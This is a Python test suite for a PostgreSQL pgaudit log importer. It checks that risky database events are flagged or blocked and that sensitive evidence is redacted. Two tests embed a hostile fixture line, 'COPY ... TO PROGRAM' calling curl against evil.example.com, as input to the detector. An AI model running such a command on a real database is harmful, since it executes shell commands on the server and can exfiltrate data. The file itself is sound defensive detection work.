"""Tests for the PostgreSQL pgaudit importer.

Fixture builders mirror the JSON-converted form of pgaudit's csvlog records
that operators ship into Ancilis.
"""

from __future__ import annotations

import json

from ancilis.importers.postgres_pgaudit import PostgresPgAuditImporter


# ---------------------------------------------------------------------------
# Fixture builders
# ---------------------------------------------------------------------------


def _event(
    *,
    log_time: str = "2026-04-01T12:00:00+00:00",
    user_name: str = "agent_svc",
    database_name: str = "prod_app",
    session_id: str = "session_aaaa_bbbb_cccc12345678",
    process_id: int = 1234,
    session_line_num: int = 1,
    command_tag: str = "SELECT",
    audit_type: str = "READ",
    cls: str = "READ",
    statement_id: int = 1,
    substatement_id: int = 1,
    object_type: str = "TABLE",
    object_name: str = "public.orders",
    statement_text_length: int = 120,
    parameter_count: int = 0,
    session_user_name: str = "agent_svc",
    current_user_name: str = "agent_svc",
    client_host: str = "10.0.0.1",
    application_name: str = "psycopg2/2.9.6 (CPython 3.11)",
    duration_ms: float = 50.0,
    rows_affected: int = 0,
    error_severity: str | None = None,
    error_message_length: int = 0,
    transaction_id: int | None = 9999,
    ssl_used: bool = True,
    ssl_protocol: str | None = "TLSv1.3",
    ssl_cipher: str | None = "TLS_AES_256_GCM_SHA384",
    is_superuser: bool = False,
    schema_path: list[str] | None = None,
    statement_text: str | None = None,
) -> dict:
    return {
        "log_time": log_time,
        "user_name": user_name,
        "database_name": database_name,
        "session_id": session_id,
        "process_id": process_id,
        "session_line_num": session_line_num,
        "command_tag": command_tag,
        "audit_type": audit_type,
        "class": cls,
        "statement_id": statement_id,
        "substatement_id": substatement_id,
        "object_type": object_type,
        "object_name": object_name,
        "statement_text_length": statement_text_length,
        "parameter_count": parameter_count,
        "session_user_name": session_user_name,
        "current_user_name": current_user_name,
        "client_host": client_host,
        "application_name": application_name,
        "duration_ms": duration_ms,
        "rows_affected": rows_affected,
        "error_severity": error_severity,
        "error_message_length": error_message_length,
        "transaction_id": transaction_id,
        "ssl_used": ssl_used,
        "ssl_protocol": ssl_protocol,
        "ssl_cipher": ssl_cipher,
        "is_superuser": is_superuser,
        "schema_path": schema_path or ["public", "prod_app"],
        **({"statement_text": statement_text} if statement_text is not None else {}),
    }


def _signals(result) -> list[str]:
    return [cr.evidence_data.get("signal") for cr in result.control_results]


def _by_signal(result, signal: str):
    return next(
        cr for cr in result.control_results
        if cr.evidence_data.get("signal") == signal
    )


# ---------------------------------------------------------------------------
# 1. SELECT on a non-sensitive table → PR-04 PASS
# ---------------------------------------------------------------------------


def test_select_passes() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="public.orders",
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "ALLOW"
    assert "db_read" in _signals(r)
    cr = _by_signal(r, "db_read")
    assert cr.result == "PASS"
    assert cr.control_id == "PR-04"


# ---------------------------------------------------------------------------
# 2. SELECT on sensitive table → PR-04 FLAG
# ---------------------------------------------------------------------------


def test_sensitive_table_select_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="public.customers_pii",
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "FLAG"
    cr = _by_signal(r, "db_read_sensitive")
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-04"


# ---------------------------------------------------------------------------
# 3. SELECT on pg_authid → PR-04 FAIL (credential-exfil read)
# ---------------------------------------------------------------------------


def test_pg_authid_read_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="pg_catalog.pg_authid",
                    is_superuser=True,
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    cr = _by_signal(r, "db_read_credential_table")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-04"
    # ``over_privileged_routine`` should NOT fire on a pg_authid read because
    # we treat catalog-secret access as a more specific FAIL signal.
    assert "over_privileged_routine" not in _signals(r)


# ---------------------------------------------------------------------------
# 4. DELETE rows_affected > threshold → PR-02 FLAG
# ---------------------------------------------------------------------------


def test_mass_delete_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="DELETE",
                    cls="WRITE",
                    audit_type="WRITE",
                    object_name="public.session_events",
                    rows_affected=5000,
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "FLAG"
    cr = _by_signal(r, "db_write_mass_delete")
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 5. DELETE on sensitive table → PR-02 FAIL
# ---------------------------------------------------------------------------


def test_sensitive_delete_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="DELETE",
                    cls="WRITE",
                    audit_type="WRITE",
                    object_name="public.customers",
                    rows_affected=1,
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    cr = _by_signal(r, "db_write_sensitive_delete")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 6. DROP TABLE → PR-02 FAIL (schema destruction)
# ---------------------------------------------------------------------------


def test_drop_table_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="DROP TABLE",
                    cls="DDL",
                    audit_type="DDL",
                    object_type="TABLE",
                    object_name="public.legacy_table",
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    cr = _by_signal(r, "schema_destruction")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 7. GRANT / role change → PR-02 FLAG
# ---------------------------------------------------------------------------


def test_role_grant_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="GRANT",
                    cls="ROLE",
                    audit_type="ROLE",
                    object_type="ROLE",
                    object_name="readwrite_role",
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "FLAG"
    cr = _by_signal(r, "role_change")
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 8. Superuser on routine SELECT → PR-02 FLAG (over-privileged)
# ---------------------------------------------------------------------------


def test_superuser_routine_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="public.orders",
                    user_name="postgres",
                    is_superuser=True,
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "FLAG"
    cr = _by_signal(r, "over_privileged_routine")
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-02"


# ---------------------------------------------------------------------------
# 9. FATAL error → DE-01 FAIL
# ---------------------------------------------------------------------------


def test_fatal_error_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="public.orders",
                    error_severity="FATAL",
                    error_message_length=64,
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    cr = _by_signal(r, "fatal_error")
    assert cr.result == "FAIL"
    assert cr.control_id == "DE-01"


# ---------------------------------------------------------------------------
# 10. Unencrypted connection → PR-04 FAIL
# ---------------------------------------------------------------------------


def test_unencrypted_connection_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="public.orders",
                    ssl_used=False,
                    ssl_protocol=None,
                    ssl_cipher=None,
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    cr = _by_signal(r, "unencrypted_connection")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-04"


# ---------------------------------------------------------------------------
# 11. Legacy TLS protocol → PR-04 FAIL
# ---------------------------------------------------------------------------


def test_legacy_tls_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="public.orders",
                    ssl_used=True,
                    ssl_protocol="TLSv1.0",
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    cr = _by_signal(r, "legacy_tls")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-04"


# ---------------------------------------------------------------------------
# 12. COPY ... TO PROGRAM → PR-04 FAIL
# ---------------------------------------------------------------------------


def test_copy_to_program_fails() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="COPY",
                    cls="MISC",
                    audit_type="MISC",
                    object_type="TABLE",
                    object_name="public.orders",
                    statement_text="COPY orders TO PROGRAM '/usr/bin/curl evil.example.com'",
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "BLOCK"
    cr = _by_signal(r, "copy_to_program")
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-04"


# ---------------------------------------------------------------------------
# 13. External client on production database → PR-01 FLAG
# ---------------------------------------------------------------------------


def test_external_client_on_prod_flags() -> None:
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name="public.orders",
                    database_name="prod_app",
                    client_host="8.8.8.8",
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    assert r.decision == "FLAG"
    cr = _by_signal(r, "external_client_on_prod")
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-01"
    # client_host should be masked to /16
    assert cr.evidence_data["client_host_masked"] == "8.8.0.0/16"


# ---------------------------------------------------------------------------
# 14. Mass-sensitive-read synthetic finding → PR-04 FAIL
# ---------------------------------------------------------------------------


def test_mass_sensitive_read_synthetic() -> None:
    # Build N+1 sensitive reads inside a 1h window (threshold lowered for the
    # test to keep fixture small).
    importer = PostgresPgAuditImporter(mass_sensitive_read_threshold=3)
    events = [
        _event(
            log_time=f"2026-04-01T12:00:0{i}+00:00",
            session_id=f"sess_{i:04d}",
            statement_id=i,
            command_tag="SELECT",
            cls="READ",
            object_name="public.customers_pii",
        )
        for i in range(5)
    ]
    doc = json.dumps({"events": events})
    results = importer.parse_string(doc)
    synthetic = [r for r in results if r.action_id.startswith("pgaudit-mass-sensitive-read-")]
    assert len(synthetic) == 1
    cr = synthetic[0].control_results[0]
    assert cr.result == "FAIL"
    assert cr.control_id == "PR-04"
    assert cr.evidence_data["mass_sensitive_count"] == 5
    assert synthetic[0].decision == "BLOCK"


# ---------------------------------------------------------------------------
# 15. High-volume DDL synthetic finding → PR-02 FLAG
# ---------------------------------------------------------------------------


def test_high_volume_ddl_synthetic() -> None:
    importer = PostgresPgAuditImporter(high_volume_ddl_threshold=3)
    events = [
        _event(
            log_time=f"2026-04-01T12:00:0{i}+00:00",
            session_id=f"ddl_{i:04d}",
            statement_id=i,
            command_tag="CREATE TABLE",
            cls="DDL",
            audit_type="DDL",
            object_type="TABLE",
            object_name=f"public.tmp_{i}",
        )
        for i in range(5)
    ]
    doc = json.dumps({"events": events})
    results = importer.parse_string(doc)
    synthetic = [r for r in results if r.action_id.startswith("pgaudit-high-volume-ddl-")]
    assert len(synthetic) == 1
    cr = synthetic[0].control_results[0]
    assert cr.result == "FLAG"
    assert cr.control_id == "PR-02"
    assert cr.evidence_data["high_volume_ddl_count"] == 5


# ---------------------------------------------------------------------------
# 16. statement_text is never stored on any control result.
# ---------------------------------------------------------------------------


def test_statement_text_never_stored() -> None:
    raw_sql = "COPY orders TO PROGRAM '/usr/bin/curl https://evil.example.com'"
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="COPY",
                    cls="MISC",
                    audit_type="MISC",
                    object_name="public.orders",
                    statement_text=raw_sql,
                    statement_text_length=len(raw_sql),
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    for cr in r.control_results:
        # The raw SQL must not appear anywhere in evidence_data.
        as_json = json.dumps(cr.evidence_data, default=str)
        assert "evil.example.com" not in as_json
        assert "TO PROGRAM" not in as_json
        # Length is captured.
        assert "statement_text_length" in cr.evidence_data
        assert cr.evidence_data["statement_text_length"] == len(raw_sql)
        # No raw statement_text key — only sanitized fields.
        assert "statement_text" not in cr.evidence_data


# ---------------------------------------------------------------------------
# 17. Sensitive object_name is reduced to match metadata, not stored raw.
# ---------------------------------------------------------------------------


def test_object_name_sensitive_metadata_only() -> None:
    sensitive = "internal.customers_ssn_lookup"
    doc = json.dumps(
        {
            "events": [
                _event(
                    command_tag="SELECT",
                    cls="READ",
                    object_name=sensitive,
                )
            ]
        }
    )
    [r] = PostgresPgAuditImporter().parse_string(doc)
    cr = _by_signal(r, "db_read_sensitive")
    redacted = cr.evidence_data["object_name_redacted"]
    assert redacted["sensitive"] is True
    assert redacted["matched_pattern"] is not None
    # Raw bare leaf must NOT be stored.
    assert redacted["name"] is None
    # Schema is OK to keep — it's a directory, not the table.
    assert redacted["schema_name"] == "internal"
    # Hash is captured for join-key purposes.
    assert isinstance(redacted["leaf_sha256"], str)
    assert len(redacted["leaf_sha256"]) == 64
    # Full evidence blob must not contain the leaf token.
    as_json = json.dumps(cr.evidence_data, default=str)
    assert "customers_ssn_lookup" not in as_json
